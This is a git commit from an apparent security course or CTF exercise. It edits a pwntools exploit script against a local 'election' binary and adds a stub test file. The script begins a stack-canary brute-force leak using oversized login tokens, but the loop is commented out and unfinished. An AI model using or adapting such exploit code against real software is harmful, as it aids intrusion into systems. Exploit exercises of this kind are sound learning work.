89bb26a304450a154448453e13046f7f42bc42f8
sytjason <r07922115@ntu.edu.tw>
2019-12-13 19:00:18 +0800

    update from x1c

--- 0x08/exp.py
+++ 0x08/exp.py
@@ -1,15 +1,30 @@
+#!/usr/bin/env python
 from pwn import *
 
 context.arch = 'amd64'
 
 r = process('./election', env={"LD_PRELOAD" : "./libc.so"})
+pause()
 
 # leak canary bruteforcely
-r.sendlineafter('>', '2') # register
-r.sendlineafter('Register an anonymous token: ', 'a' * 0xb8)
-r.sendlineafter('>', '1') # login
-r.sendlineafter('Token: ', 'a' * 0xb7) 
+aaa = 'b' * 0xb8
+canary_leaker = bytearray(b'\x00' * 0xb8)
+i = 0
 
+# while 1:
+r.sendlineafter('>', '2') # register
+r.sendlineafter('Register an anonymous token: ', aaa)
+r.sendlineafter('>', '1') # login
+r.sendlineafter('Token: ', aaa + b'\x00') 
+    # if canary_leaker[i] == 0xff:
+        # j = i
+        # i += 1
+        # while j != 0:
+            
+    # canary_leaker[i] += 1
+    # if 'Invalid' not in r.recvline():
+        # success('buf 0x10 bytes match: {}'.format(canary_leaker))
+        # break
 
 r.interactive()
 
---
+++ 0x08/test.py
@@ -0,0 +1,6 @@
+canary_leaker = bytearray(b'\x00' * 0x08)
+x = 0
+for i in range(1000):
+
+    
+
